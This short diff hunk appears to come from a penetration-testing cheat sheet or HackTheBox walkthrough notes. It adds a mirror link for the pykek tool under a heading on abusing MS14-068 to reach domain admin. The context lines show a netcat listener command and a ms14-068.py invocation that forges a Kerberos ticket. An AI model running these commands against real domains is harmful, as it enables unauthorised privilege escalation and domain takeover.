@@ -114,7 +114,8 @@ nc -nlvp 445
 ```
 ### Abusing MS14-068 to domain admin
 ```
-https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek  
+https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek
+https://github.com/mubix/pykek
 ms14-068.py -u <userName>@<domainName> -s <userSid> -d mantis.htb.local --rc4 ntlm_hash
 
 It will generate ccache file
